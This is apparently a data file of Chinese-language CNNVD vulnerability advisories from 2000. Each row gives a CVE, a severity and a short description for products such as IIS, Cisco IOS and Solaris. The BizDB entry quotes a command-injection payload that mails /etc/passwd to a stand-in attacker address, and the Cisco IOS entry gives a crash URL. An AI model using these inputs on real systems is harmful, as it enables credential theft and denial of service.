+Cisco Secure PIX防火墙伪造TCP RST漏洞,CNNVD-200003-038,2000-03-20,2005-07-27,低危,授权问题,Cisco Secure PIX防火墙存在漏洞，不能正确辨识伪造的TCP置位包(RST)，远程攻击者可以利用这个漏洞迫使防火墙关闭合法连接。,CVE-2000-0613
+Microsoft IIS 4.0分块传输编码的缓冲区溢出漏洞,CNNVD-200003-037,2000-03-20,2005-10-12,低危,授权问题,IIS 4.0存在漏洞，攻击者可以通过在POST或PUT命令中请求超大缓存消耗内存触发拒绝服务，也称为“块传输编码缓冲区溢出漏洞。”,CVE-2000-0226
+vqSoft vqServer Plaintext的密码漏洞。,CNNVD-200003-039,2000-03-21,2005-10-20,低危,授权问题,vqSoft vqServer存在漏洞，它存储例如在server.cfg文件中的cleartext的密码之类的敏感信息，远程攻击者可以利用这个漏洞取得权限。,CVE-2000-0241
+vqSoft vqServer漏洞,CNNVD-200003-040,2000-03-21,2010-12-02,低危,授权问题,vqSoft vqServer程序存在漏洞，远程攻击者可以通过URL中的/........../ 和.. (点点)的变种攻击读取任意文件。,CVE-2000-0240
+Generic-NQS漏洞,CNNVD-200003-042,2000-03-22,2010-12-02,高危,授权问题,Generic-NQS中存在未知漏洞，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0247
+多个Linux厂商的gpm Setgid漏洞,CNNVD-200003-041,2000-03-22,2005-05-02,高危,授权问题,gpm package包中的gpm-root存在漏洞，他不能正确降低权限，本地用户可以通过开启gpm-root功能取得权限。,CVE-2000-0229
+多个Linux厂商的域套接字的拒绝服务漏洞,CNNVD-200003-043,2000-03-23,2005-10-20,低危,授权问题,Linux 2.2.x kernel存在漏洞，他没有根据wmem_max参数的定义限制Unix域套接字的数量，本地用户可以通过请求超大数量的套接字触发拒绝服务。,CVE-2000-0227
+GeoCel WindMail远程获取文件漏洞,CNNVD-200003-045,2000-03-25,2005-10-20,低危,配置错误,"WindMail是一个命令行的邮件工具，可以被集成到Perl CGI应用程序中，用来创建基于Web的邮件程序。 WindMail 3.0及以前版本实现上存在漏洞，远程攻击者可能利用此漏洞远程获取主机的任意已知文件名及路径的文件。 WindMail以两种方式工作：命令行模式和解释选项头模式。在命令行模式下，""-n""标记用于指定做为信件文本的文件的文件名，攻击者可以指定任意已知文件名和路径的文件。在解释选项头模式下，""-n""标记指定包含了一系列邮件头的文件，比如'Attach:'头，攻击者如果能在服务器上创建那个邮件头文件，也可以获得系统文件。",CVE-2000-0242
+AnalogX SimpleServer WWW HTTP server 漏洞,CNNVD-200003-044,2000-03-25,2010-12-02,中危,授权问题,AnalogX SimpleServer:WWW HTTP server 1.03存在漏洞，远程攻击者可以通过对cgi-bin超短GET请求触发拒绝服务。,CVE-2000-0243
+Napster client 缓冲区溢出漏洞,CNNVD-200003-046,2000-03-26,2010-12-02,低危,授权问题,Napster client beta 5存在缓冲区溢出漏洞，远程攻击者可以通过超长信息触发拒绝服务。,CVE-2000-0281
+FreeBSD Orville-write 端口漏洞,CNNVD-200003-049,2000-03-27,2005-05-02,高危,授权问题,orville-write包中的huh程序存在缓冲区溢出漏洞，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0235
+IRIX Objectserver 漏洞,CNNVD-200003-048,2000-03-27,2005-05-02,高危,授权问题,SGI IRIX objectserver daemon存在漏洞，远程攻击者可以利用这个漏洞生成新账号。,CVE-2000-0245
+Linux漏洞,CNNVD-200003-047,2000-03-27,2010-12-02,低危,授权问题,"Linux 2.2.x存在IP伪装漏洞，远程攻击者可以通过修改外部IP源地址和端口号来匹配已建连接,由内部接口的路由UDP包配合建立链接。",CVE-2000-0289
+ICA Weak 弱加密漏洞,CNNVD-200003-050,2000-03-29,2005-10-20,高危,授权问题,Citrix ICA协议的用户认证使用弱加密存在漏洞。,CVE-2000-0244
+NT / Windows 2000 TCP/IP 打印服务的拒绝服务漏洞,CNNVD-200003-051,2000-03-30,2005-05-02,低危,授权问题,Microsoft TCP/IP的打印服务存在拒绝服务漏洞，也称Unix的打印服务漏洞，攻击者可以通过异常的TCP/IP打印请求触发拒绝服务。,CVE-2000-0232
+Novell Border Manager 审查跟踪代理的拒绝服务漏洞,CNNVD-200003-053,2000-03-30,2005-05-02,中危,授权问题,Novell BorderManager 3.5存在漏洞，远程攻击者可以通过在2000端口的telnet连接中键入enter键促发拒绝服务。,CVE-2000-0152
+Microsoft IIS UNC映射虚拟主机漏洞,CNNVD-200003-052,2000-03-30,2006-09-25,低危,授权问题,IIS 4.0 and 5.0存在漏洞，如果虚拟路径映射到UNC共享便不能正确处理ISAPI extension，远程攻击者可以利用这个漏洞读取ASP和其他文件的源码，也称“虚拟UNC共享”漏洞。,CVE-2000-0246
+Microsoft Windows Index Server '%20'远程ASP源码泄露漏洞(MS00-006),CNNVD-200003-056,2000-03-31,2005-05-02,低危,授权问题,Microsoft Index Server是Windows NT 4.0可选安装包中包括的一个基于Web的搜索引擎，在Windows 2000系统中作为一个服务安装。 Index Server的Webhits.dll实现上存在漏洞，远程攻击可能利用此漏洞读取系统上ASP脚本的源码或其它系统文件的内容。Cerberus安全小组现在微软的Index Server服务上发现了第三个漏洞。对于运行在IIS4或IIS5上的Index Server，即使您把最近的补丁给打上了或者没有.htw文件，都同样受到此漏洞的影响。其中的风险包括系统中的很多ASP页面的源代码或者是象global.asa的文件会被攻击者查看。这些文件包含了很多敏感信息，象用户的ID和密码、还有数据源、数据库用户名及密码。这些都会给攻击者攻击站点/网络提供便利。 存在该问题的其中一个原因是因为'null.htw'没有一个映射到系统中任意文件的真实文件。另外，它是一个在内存中的'虚拟文件'，因此，即使没有一个真实的.htw文件在系统中也同样存在风险。任何对null.htw的请求都由webhits.dll来处理。,CVE-2000-0302
+4D Inc. WebSTAR的拒绝服务攻击,CNNVD-200003-055,2000-03-31,2005-10-21,低危,授权问题,Webstar HTTP 服务器存在缓冲区溢出漏洞，远程攻击者可以通过超长GET请求触发拒绝服务。,CVE-2000-0290
+Cobalt Raq Apache .htaccess Disclosure 漏洞,CNNVD-200003-054,2000-03-31,2006-08-28,低危,配置错误,Cobalt RaQ2 和 RaQ3按access.conf文件默认配置存在漏洞，远程攻击者可以利用这个漏洞查看.htaccess 文件中的敏感内容。,CVE-2000-0234
+SalesLogix eViewer远程拒绝服务攻击漏洞,CNNVD-200008-001,2000-03-31,2005-05-02,低危,授权问题,SalesLogix eViewer是SalesLogix 2000软件包带的一个Web CGI程序。 SalesLogix的CGI管理实现上存在漏洞，远程攻击者可能利用此漏洞非授权执行管理功能。,CVE-2000-0278
+fcheck漏洞,CNNVD-200003-057,2000-03-31,2010-12-02,高危,授权问题,fcheck存在漏洞，本地用户可以通过在fcheck处理的文件名中嵌入shell元字符取得特权。,CVE-2000-0296
+Netscape漏洞,CNNVD-200004-001,2000-04-01,2010-12-02,低危,授权问题,Netscape 存在漏洞，远程攻击者可以通过JavaScript从Netscaped的用户缓存中读取信息。,CVE-1999-0790
+Real Networks RealPlayer 6/7本地缓冲区溢出漏洞,CNNVD-200004-005,2000-04-03,2006-01-05,低危,授权问题,RealNetworks RealPlayer client versions 6 和 7 中纯正缓冲区溢出漏洞，远程攻击者可以通过超长本地URL触发拒绝服务。,CVE-2000-0280
+CommuniGate漏洞,CNNVD-200004-003,2000-04-03,2010-12-02,中危,授权问题,CommuniGate Pro 3.2.5及早期的web管理接口存在漏洞，远程攻击者可以通过..攻击读取任意文件。,CVE-2000-0634
+Microsoft Excel XML 漏洞,CNNVD-200004-004,2000-04-03,2005-10-12,高危,授权问题,Microsoft Excel 97 and 2000存在漏洞，在对外部文本文件执行Excel宏语言(XLM)时没有警告用户，远程攻击者可以利用这个漏洞执行宏病毒，也称“XLM 文本宏”漏洞。,CVE-2000-0277
+"Allaire Forums 的""rightAccessAllForums"" 漏洞",CNNVD-200004-002,2000-04-03,2005-05-02,中危,授权问题,Allaire Forums 2.0.5存在漏洞，远程攻击者可以通过rightAccessAllForums或rightModerateAllForums变量绕过访问限制到达安全会议。,CVE-2000-0297
+WebObjects远程溢出漏洞,CNNVD-200004-006,2000-04-04,2005-10-20,低危,授权问题,WebObjects Developer 4.5 包中的WebObjects.exe存在漏洞，远程攻击者可以通过例如Accept的超长头部的HTTP请求触发拒绝服务。,CVE-2000-0299
+Nbase-Xyplex EdgeBlaster漏洞,CNNVD-200004-007,2000-04-05,2010-12-02,低危,授权问题,Nbase-Xyplex EdgeBlaster 路由器存在漏洞，远程攻击者可以通过扫描FormMail CGI程序触发拒绝服务。,CVE-2000-0255
+HP VirtualVault Aliased IP地址漏洞,CNNVD-200004-009,2000-04-06,2005-05-02,低危,其他,HP-UX 11.04 VirtualVault存在漏洞，它通过多别名IP地址的接口发送数据到无权限进程。,CVE-2000-0251
+Ipswitch IMAIL server漏洞,CNNVD-200004-008,2000-04-06,2010-12-02,低危,授权问题,Ipswitch IMAIL server 6.02和早期版本，远程攻击者可以通过AUTH CRAM-MD5命令触发拒绝服务。,CVE-2000-0301
+Symantec pcAnywhere弱加密漏洞,CNNVD-200004-010,2000-04-06,2005-10-20,超危,授权问题,PcAnywhere 9.x的缺省加密算法强度弱，存在漏洞，远程攻击者可以利用这个漏洞嗅探和破译 PcAnywhere或NT的域账号。,CVE-2000-0300
+BeOS IP包长度域漏洞,CNNVD-200004-011,2000-04-07,2005-08-24,低危,其他,BeOS存在漏洞，远程攻击者通过长度域少于头部的异常包触发拒绝服务。,CVE-2000-0279
+Microsoft Windows 2000 无人值守预安装漏洞,CNNVD-200004-012,2000-04-07,2005-05-02,高危,配置错误,Windows 2000无人值守安装的OEMPreinstall选项存在漏洞，它对所有用户和缺省用户目录设置非安全的权限。,CVE-2000-0298
+PCAnywhere漏洞,CNNVD-200004-013,2000-04-09,2010-12-02,低危,授权问题,PCAnywhere存在漏洞，远程攻击者可以通过在PCAnywhere 提供一个登陆提示前终止连接触发拒绝服务。,CVE-2000-0273
+BeOS漏洞,CNNVD-200004-016,2000-04-10,2010-12-02,低危,授权问题,BeOS 4.5 and 5.0 存在漏洞，本地用户可以通过使用37号中断的这种异常的直接系统调用方式触发拒绝服务。,CVE-2000-0276
+CRYPTOCard CRYPTOAdmin 4.1的弱加密漏洞,CNNVD-200004-017,2000-04-10,2005-10-20,低危,授权问题,PalmOS的CRYPTOCard CryptoAdmin使用弱加密存储用户的PIN号存在漏洞，攻击者可以在破解PIN后通过访问.PDB文件生成有效的PT-1符号。,CVE-2000-0275
+healthd缓冲区溢出错误,CNNVD-200004-014,2000-04-10,2005-05-02,高危,授权问题,FreeBSD的healthd存在缓冲区溢出漏洞，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0294
+Bray Systems 1.5 Linux Trustee超长路径名漏洞,CNNVD-200004-015,2000-04-10,2005-05-02,低危,授权问题,The Linux trustees kernel路径存在漏洞，攻击者可以通过使用超长名访问文件或目录来触发拒绝服务。,CVE-2000-0274
+dansie cart.pl漏洞,CNNVD-200004-021,2000-04-11,2010-12-02,超危,授权问题,dansie消费卡中的cart.pl应用程序存在漏洞，远程攻击者可以通过隐藏表单字段修改敏感购买信息。,CVE-2000-0253
+SCO Unixware 特权调试程序漏洞,CNNVD-200004-018,2000-04-11,2005-05-02,高危,授权问题,SCO UnixWare 特权过程系统存在漏洞，本地用户可以通过使用例如gdb的调试器在特权进程执行前将trap插入_init处从而获得根用户权限。,CVE-1999-0979
+NT无人值守文件安装漏洞,CNNVD-200004-020,2000-04-11,2005-05-02,高危,配置错误,NT 4.0在无人值守安装后的文件安装存在漏洞，可能包括例如本地管理员密码的敏感信息。,CVE-1999-0701
+dansie cart.pl漏洞,CNNVD-200004-022,2000-04-11,2010-12-02,低危,授权问题,dansie消费卡中的cart.pl应用程序存在漏洞，远程攻击者可以通过表单变量中的shell元字符执行命令。,CVE-2000-0252
+Sapphire/Web 验证漏洞,CNNVD-200004-023,2000-04-11,2005-05-02,高危,授权问题,Bluestone Sapphire的web服务存在漏洞，攻击者可以通过简单猜测会话IDs劫持会话。,CVE-1999-0699
+Sybase Power Dynamo 目录遍历漏洞,CNNVD-200004-019,2000-04-11,2005-05-02,低危,其他,Sybase PowerDynamo的个人web服务存在漏洞，攻击者可以通过 ..(点点)攻击读取任意文件。,CVE-1999-0695
+AVM KEN! 1.3.10目录遍历漏洞,CNNVD-200004-028,2000-04-12,2005-05-02,低危,授权问题,AVM KEN!的web服务器存在漏洞，远程攻击者可以通过..(点点)攻击读取任意文件。,CVE-2000-0261
+IRIX Performance Copilot漏洞,CNNVD-200004-029,2000-04-12,2010-12-02,中危,授权问题,IRIX Performance Copilot的缺省安装存在漏洞，远程攻击者可以通过pmcd 守护进程访问敏感系统信息。,CVE-2000-0283
+BizDB bizdb-search.cgi搜索引擎CGI导致用户远程执行shell命令,CNNVD-200004-030,2000-04-12,2005-05-02,超危,授权问题,"BizDB是Cnctek开发的数据库以及搜索引擎软件。 BizDB安装程序中包含一个CGI脚本：bizdb-search.cgi，它被用来搜索bizdb数据库。攻击者可以通过修改CGI参数使bizdb-search.cgi在Web服务器上执行shell命令。 bizdb-search.cgi使用""open""命令来打开数据库文件，该文件名是由""dbname""变量接收 用户输入的。它并没有对输入数据进行检查。攻击者可以用带有管道符的shell命令替换掉 正常的数据库文件名：""bizdb""，例如： "";cat%20/etc/passwd|mail%20attacker@evil.site|"" 这样，/etc/passwd文件的内容就会被发送到攻击者的邮箱中去。这个脚本会检查是否 HTTP_REFERER变量是否被正确设置，但是这个变量是很容易被伪造的，因此并不能真正 阻止攻击的发生。",CVE-2000-0287
+Microsoft NT 4.0 OffloadModExpo注册权限漏洞。,CNNVD-200004-026,2000-04-12,2005-10-20,高危,配置错误,在Windows NT 4.0中的OffloadModExpo的Cryptography\Offload缺省权限注册键值存在漏洞，本地用户可以利用这个漏洞获得其他用户的密码危害他人。,CVE-2000-0259
+Microsoft IIS 4.0/5.0 转义字符漏洞,CNNVD-200004-027,2000-04-12,2005-10-12,高危,授权问题,IIS 4.0 and 5.0存在漏洞，攻击者可以通过发送很多包含大量转义字符的URLs触发拒绝访问，也称“无数转义字符”漏洞。,CVE-2000-0258
+Infonautics getdoc.cgi 漏洞,CNNVD-200004-024,2000-04-12,2010-12-02,低危,授权问题,Infonautics getdoc.cgi 存在漏洞，远程攻击者可以通过修改表单变量绕过付款流程访问文档。,CVE-2000-0288
+AVM KEN! 1.3.10目录遍历漏洞,CNNVD-200004-025,2000-04-12,2005-05-02,低危,授权问题,AVM KEN! ISDN 代理服务器存在漏洞，远程攻击者可以通过异常请求触发拒绝服务。,CVE-2000-0262
+Web+shopping TalentSoft webpsvr漏洞,CNNVD-200004-031,2000-04-12,2010-12-02,低危,授权问题,Web+shopping 卡应用程序的TalentSoft webpsvr守护进程存在漏洞，远程攻击者可以通过针对webplus CGI 程序的.. 攻击读取任意文件。,CVE-2000-0282
+Microsoft IIS 4.0 FrontPage 98扩展察看CGI脚本源代码后门漏洞(MS00-025),CNNVD-200004-032,2000-04-14,2005-10-12,高危,授权问题,"FrontPage 98 Extensions是微软的一个产品，包括PWS和IIS版本，可以让网页设计人员方便的直接用FrontPage直接连接到PWS或者IIS上进行网页创作。 FrontPage 98 Extensions包含的两个动态连接库文件存在两个后门，可以被攻击者利用来查看CGI程序源代码。 微软IIS FrontPage 98 extensions所带的两个动态连接库dvwssr.dll和mtd2lv.dll存在一个隐藏后门。这个后门实际上是一个隐藏的字符串:""Netscape engineers are weenies!""。攻击者可以将要下载的.asp文件(或者global.asa)名用这隐含字符串编码，并提供给dvwssr.dll就可能远程下载web服务器上的.asp或者.asa源代码。",CVE-2000-0260
+Microsoft Windows漏洞,CNNVD-200004-033,2000-04-14,2019-05-08,高危,其他,"Microsoft Windows是美国微软（Microsoft）公司的一套个人设备使用的操作系统。 Microsoft Windows 98, NT 4.0, 2000, 和 XP域名分析器的缺省配置存在漏洞，导致Windows接收未请求的主机的DNS更新，远程攻击者可以利用这个漏洞破坏DNS缓存。",CVE-2000-1218
+dansie cart.pl 漏洞,CNNVD-200004-034,2000-04-14,2010-12-02,低危,授权问题,dansie消费卡的cart.pl应用程序存在漏洞，远程攻击者可以通过引用env，db或vars表单变量的URL获得消费卡的数据库。,CVE-2000-0254
+QNX crypt() 漏洞,CNNVD-200004-035,2000-04-14,2006-09-25,高危,授权问题,QNX中的crypt函数用弱加密存在漏洞，本地用户可以利用这个漏洞解密。,CVE-2000-0250
+华盛顿大学的imapd的缓冲区溢出漏洞,CNNVD-200004-040,2000-04-16,2005-10-20,高危,授权问题,华盛顿大学的4.7版本的imapd存在缓冲区溢出漏洞，用户可以通过LIST或其他指令以合法账号执行命令。,CVE-2000-0284
+Red Hat Linux X font server xfs漏洞,CNNVD-200004-038,2000-04-16,2010-12-02,低危,授权问题,Red Hat Linux 6.x中的X font server xfs存在漏洞，攻击者可以通过异常请求触发拒绝服务。,CVE-2000-0263
+XFree86 Xserver缓冲区溢出漏洞,CNNVD-200004-037,2000-04-16,2005-05-02,高危,授权问题,XFree86 3.3.x存在缓冲区溢出漏洞，本地用户可以通过超长-xkbmap变量执行任意指令。,CVE-2000-0285
+Star Office 5.1 缓冲区溢出漏洞,CNNVD-200004-036,2000-04-16,2005-10-20,中危,授权问题,Star Office 5.1存在缓冲区溢出漏洞，攻击者可以通过在文档中嵌入超长URL触发拒绝服务。,CVE-2000-0291
+Multiple Vendor X Font Server拒绝服务和缓冲区溢出漏洞,CNNVD-200004-039,2000-04-16,2005-10-20,低危,授权问题,X fontserver xfs存在漏洞，本地用户可以通过对服务器的异常输入触发拒绝服务。,CVE-2000-0286
+Panda Security漏洞,CNNVD-200004-042,2000-04-17,2010-12-02,中危,授权问题,Panda Security 3.0存在漏洞，用户可以通过它的增加/删除子程序卸载Panda软件。,CVE-2000-0265
+Panda Security 3.0 的多个漏洞,CNNVD-200004-041,2000-04-17,2005-05-02,低危,授权问题,未使能注册表编辑的Panda Security 3.0存在漏洞，用户可以通过直接执行.reg文件或其他方法编辑注册表和获取特权。,CVE-2000-0264
+GNU Emacs本地窃听漏洞,CNNVD-200004-044,2000-04-18,2005-10-20,低危,授权问题,Emacs 20存在漏洞，它在启动新的子进程时没有为从设备PTY正确设置权限，本地用户可以利用这个漏洞读取或修改Emacs与子进程间的通信。,CVE-2000-0269
+Microsoft Internet Explorer 安全漏洞,CNNVD-200004-045,2000-04-18,2021-07-26,低危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 5.01存在安全漏洞，远程攻击者可以通过与Java JSObject共同作用的恶意程序修改DOM属性，对任意Javascript UR设置IFRAME，从而绕过cross frame安全策略。,CVE-2000-0266
+GNU Emacs本地窃听漏洞,CNNVD-200004-047,2000-04-18,2005-10-20,低危,授权问题,Emacs 20中的make-temp-name Lisp函数存在漏洞，它在新建的临时文件时以可预料的名字命名，攻击者可以利用这个漏洞引导符号连接攻击。,CVE-2000-0270
+GNU Emacs本地窃听漏洞,CNNVD-200004-043,2000-04-18,2005-10-20,中危,授权问题,Emacs 20中的read-passwd和其他Lisp函数没有正确清除最近键入字符的历史信息，存在漏洞，攻击者可以利用这个漏洞读取非加密的口令。,CVE-2000-0271
+HP asecure audio.sec漏洞,CNNVD-200004-046,2000-04-18,2010-12-02,中危,授权问题,HP asecure以非安全权限建立audio.sec音频安全文件存在漏洞，本地用户可以利用这个漏洞触发访问拒绝或获取更大的权限。,CVE-2000-0083
+MS Frontpage Image Mapper的缓冲区溢出漏洞。,CNNVD-200004-048,2000-04-19,2005-10-20,高危,授权问题,FrontPage 97 和 98 的Server Extensions中的htimage.exe 和 Imagemap.exe存在缓冲区溢出漏洞，用户可以利用这个漏洞使自己的操作行为在web站点上不留痕迹，也称作“Server-Side Image Map 组件”漏洞。,CVE-2000-0256
+NetWare 缓冲区溢出漏洞,CNNVD-200004-050,2000-04-19,2010-12-02,高危,授权问题,NetWare的远程web管理工具存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞触发拒绝服务或通过一个超长URL执行命令。,CVE-2000-0257
+Adtran MX2800 M13 Multiplexer漏洞,CNNVD-200004-049,2000-04-19,2010-12-02,低危,授权问题,Adtran MX2800 M13 Multiplexer存在漏洞，远程攻击者可以利用以太网的ping洪泛触发拒绝服务，这将导致设备瘫痪。,CVE-2000-0292
+Windows 2000活动对象目录属性漏洞,CNNVD-200004-053,2000-04-20,2005-10-12,低危,授权问题,Windows 2000域控制器存在漏洞，恶意用户可以通过修改未受保护的属性修改活动目录，也称为“混合对象访问”漏洞。,CVE-2000-0311
+Microsoft Windows缓冲区溢出漏洞,CNNVD-200004-052,2000-04-20,2010-12-02,低危,授权问题,Microsoft 的 Windows NT 和 Windows 2000的命令进程(CMD.EXE)存在缓冲区溢出漏洞，本地用户可以通过超长环境变量触发拒绝服务，也称为“异常环境变量”漏洞。,CVE-2000-0331
+Cisco IOS TELNET环境变量处理拒绝服务漏洞,CNNVD-200004-051,2000-04-20,2006-08-28,低危,授权问题,"Cisco Internet Operating System(IOS)是一款使用于CISCO路由器上的操作系统。 Cisco IOS软件的某些版本在处理Telnet传递的环境变量时存在问题，远程攻击者可能利用此漏洞导致设备拒绝服务。 当一个特定的Telnet参数(""ENVIRON""变量)传送给Cisco IOS Telnet服务程序，将导致IOS自动重载。这种攻击可以重复持续进行，因而形成一种拒绝服务攻击。 <*链接：http://www.cisco.com/warp/public/707/iostelnetopt-pub.shtml *>",CVE-2000-0268
+Cisco Catalyst使能密码旁路漏洞,CNNVD-200004-054,2000-04-20,2005-10-12,中危,授权问题,Cisco Catalyst 5.4.x存在漏洞，用户可以访问“使能”模式而无需密码。,CVE-2000-0267
+RealNetworks RealServer漏洞,CNNVD-200004-055,2000-04-20,2010-12-02,中危,授权问题,RealNetworks RealServer存在漏洞，远程攻击者可以通过发送异常输入到服务器的7070端口触发拒绝服务。,CVE-2000-0272
+Atrium Mercur Mail Server漏洞,CNNVD-200004-058,2000-04-21,2010-12-02,高危,授权问题,Atrium Mercur Mail Server 3.2存在漏洞，本地攻击者可以通过点点(..)攻击读取其他用户的电子邮件和任意文件。,CVE-2000-0318
+Qpopper漏洞,CNNVD-200004-057,2000-04-21,2010-12-02,低危,授权问题,Qpopper 2.53 和 3.0没有正确识别\n这个确认文本信息结尾的字符串存在漏洞，远程攻击者可以通过1023个字符长度和以\n结尾的信息行触发拒绝服务或邮箱崩溃。,CVE-2000-0320
+OpenLDAP /usr/tmp/ 的符号连接漏洞,CNNVD-200004-056,2000-04-21,2005-05-02,低危,授权问题,Linux OpenLDAP 服务器存在漏洞，本地用户可以通过符号连接攻击修改任意文件。,CVE-2000-0336
+多个厂商Linux LCDProc的缓冲区溢出漏洞,CNNVD-200004-059,2000-04-21,2005-10-20,超危,授权问题,LCDproc中存在缓冲区溢出漏洞，远程攻击者可以通过screen_add命令获取根用户权限。,CVE-2000-0295
+IMP/MSWordView /tmp文件删除拒绝服务漏洞,CNNVD-200004-060,2000-04-22,2005-05-02,低危,其他,IMP和MSWordView应用软件没有正确删除文件存在漏洞，本地用户可以通过超大数量的文档用完所以磁盘空间并提前停止请求触发拒绝服务。,CVE-2000-0459
+IMP/MSWordView /tmp文件许可漏洞,CNNVD-200004-061,2000-04-22,2005-05-02,低危,授权问题,IMP的MSWordView应用软件在/tmp目录建立完全可读文件存在漏洞，其他本地用户可以利用这个漏洞读取潜在敏感信息。,CVE-2000-0458
+Concurrent Versions Software漏洞,CNNVD-200004-062,2000-04-23,2010-12-02,低危,授权问题,Concurrent Versions Software(CVS)使用可预测的临时文件名锁定存在漏洞，本地用户可以通过在其他合法的CVS用户使用前生成锁定目录触发拒绝访问。,CVE-2000-0338
+Sendmail mail.local漏洞,CNNVD-200004-063,2000-04-23,2010-12-02,低危,授权问题,Sendmail 8.10.x中的mail.local没有正确识别\n这个确认文本信息结尾的字符串存在漏洞，远程攻击者可以通过2047个字符长度和\n字符串结尾的信息行触发拒绝服务。,CVE-2000-0319
+RedHat Piranha Virtual Server包缺省账号和密码漏洞。,CNNVD-200004-065,2000-04-24,2005-10-20,超危,配置错误,Red Hat Linux Piranha包中的Linux Virtual Server软件的web图形用户界面存在后门密码，远程攻击者可以利用这个漏洞执行任意指令。,CVE-2000-0248
+IC Radius缓冲区溢出漏洞,CNNVD-200004-067,2000-04-24,2005-10-20,低危,授权问题,IC Radius 存在缓冲区溢出漏洞，远程攻击者可以通过超长用户名触发访问控制。,CVE-2000-0321
+Spectra Container Editor预览对象安全漏洞,CNNVD-200004-069,2000-04-24,2005-05-02,低危,授权问题,Allaire Spectra 容器编辑工具没有正确执行对象安全策略，存在漏洞，攻击者可以通过在容器对象上增加发行规则的对象方法实施未授权行动。,CVE-2000-0334
+Solaris Xsun缓冲区溢出漏洞,CNNVD-200004-064,2000-04-24,2005-05-02,高危,授权问题,Solaris 7的Xsun X server存在缓冲区溢出漏洞，本地用户可以通过超长-dev参数获取根用户权限。,CVE-2000-0337
+Solaris lp -d 选项缓冲区溢出漏洞,CNNVD-200004-070,2000-04-24,2005-05-02,高危,授权问题,Solaris 7 lp存在缓冲区溢出漏洞，本地用户可以通过超长-d选项获取根用户权限。,CVE-2000-0316
+Solaris lpset -r缓冲区溢出漏洞,CNNVD-200004-068,2000-04-24,2005-10-20,高危,授权问题,Solaris 7 lpset 存在缓冲区溢出漏洞，本地用户可以通过超长-r选项获得根用户权限。,CVE-2000-0317
+RedHat Piranha软件包中passwd.php3脚本执行任意命令漏洞,CNNVD-200004-071,2000-04-24,2005-05-02,超危,授权问题,RedHat 6.2附带Piranha virtual server软件包中passwd.php3脚本存在一个安全漏洞。 passwd.php3脚本由于未对输入进行适当的检查，导致任何可以通过Piranha软件包鉴别机制的用户以当前WWW服务器对应之有效用户ID，执行任意命令。这将作为进一步损害系统安全 性的前奏攻击手段。,CVE-2000-0322
+ZoneAlarm Personal防火墙的67端口漏洞,CNNVD-200004-066,2000-04-24,2005-05-02,高危,其他,ZoneAlarm 2.1.10和早期版本在67源端口没有过滤UDP包存在漏洞，远程攻击者可以利用这个漏洞绕过防火墙规则。,CVE-2000-0339
+pcAnywhere漏洞,CNNVD-200004-073,2000-04-25,2010-12-02,低危,授权问题,pcAnywhere 8.x 和 9.0存在漏洞，远程攻击者可以通过TCP同步扫描，例如利用nmap触发拒绝服务。,CVE-2000-0324
+Meeting Maker 弱加密漏洞,CNNVD-200004-072,2000-04-25,2005-10-20,低危,授权问题,"Meeting Maker使用弱加密(密码学术语),远程攻击者可以利用这个漏洞嗅探和破解Meeting Maker的密码。",CVE-2000-0326
+"Cisco IOS Web管理接口""%%""字串远程拒绝服务攻击漏洞",CNNVD-200004-074,2000-04-26,2005-07-27,低危,授权问题,"Cisco IOS是广泛运行于Cisco系统各种网络设备中的操作系统。 多种Cisco路由器运行的IOS的HTTP管理接口实现上存在漏洞，远程攻击者可能利用此漏洞对设备进行拒绝服务攻击。 如果这些路由器启动了一个WEB服务器，用来对路由器进行管理或者其他操作的话，(通常是通过添加""ip http server ""类似的命令来启动web服务的)攻击者只要提交一个URL: http://victim.router/%% ，就能导致路由器崩溃。有些路由器会自动重起，有的则必须手工关闭电源并启动才能使路由器恢复正常工作。",CVE-2000-0380
+AIX frcactrl 非安全文件处理漏洞。,CNNVD-200004-075,2000-04-26,2005-05-02,高危,授权问题,AIX Fast Response Cache Accelerator (FRCA)存在漏洞，本地用户可以通过frcactrl程序的配置能力修改任意文件。,CVE-2000-0249
+xmonisdn IFS/PATH 漏洞,CNNVD-200004-077,2000-04-27,2005-05-02,高危,其他,Linux xmonisdn 包存在漏洞，本地用户可以通过修改IFS或PATH环境变量获取根用户权限。,CVE-1999-0706
+Cart32漏洞,CNNVD-200004-076,2000-04-27,2010-12-02,中危,授权问题,Cart32 3.0和早期版本的后门密码存在漏洞，远程攻击者可以利用这个漏洞这些任意命令。,CVE-2000-0429
+Eudora 4.2/4.3警告信息规避漏洞,CNNVD-200004-078,2000-04-28,2005-10-12,低危,授权问题,"Eudora 4.x存在漏洞，远程攻击者可以利用这个漏洞绕过用户警告，通过使用引用附件的.lnk文件执行例如.exe, .com, 和 .bat的附件。",CVE-2000-0342
+SuSE Linux Gnomelib缓冲区溢出漏洞,CNNVD-200004-079,2000-04-29,2010-12-02,高危,授权问题,SuSE Linux 6.3中的Gnomelib存在缓冲区溢出漏洞，本地用户可以通过DISPLAY环境变量这些任意命令。,CVE-2000-0340
+网络沟通软件WebShield SMTP配置修改漏洞,CNNVD-200005-007,2000-05-01,2005-05-02,低危,授权问题,WebShield SMTP版本为4.5.44管理工具在还没有将IP地址解析为主机名时没有正确限制对管理端口的访问，远程攻击者可以通过GET_CONFIG命令访问任意配置。,CVE-2000-0448
+PDGSoft消费卡多缓冲区溢出漏洞,CNNVD-200005-004,2000-05-01,2005-10-20,高危,授权问题,PDGSoft消费卡的redirect.exe和changepw.exe程序存在缓冲区溢出漏洞，远程攻击者可以通过超长请求字符串执行任意命令。,CVE-2000-0401
+Cassandra NNTPServer v1.10远程缓冲区溢出漏洞,CNNVD-200005-003,2000-05-01,2005-05-02,低危,授权问题,Cassandra NNTP是一个新闻组服务器程序。 Cassandra NNTP实现上存在一个缓冲区溢出漏洞，远程攻击者可能利用此漏洞对服务器程序进行拒绝服务攻击。 Cassandra NNTP v1.10 server软件在处理登陆信息时没有进行正确的长度检查，当用户输入一个长度超过10000字节的登陆名时，将导致NNTP Server停止响应，直到管理员重新启动此应用程序。,CVE-2000-0341
+多个厂商*BSD非连续IP选项的拒绝服务漏洞,CNNVD-200005-002,2000-05-01,2005-05-02,低危,其他,NetBSD 1.4.2和早期版本存在漏洞，攻击者可以通过发送非连续IP时间戳选项的包触发拒绝服务。,CVE-2000-0440
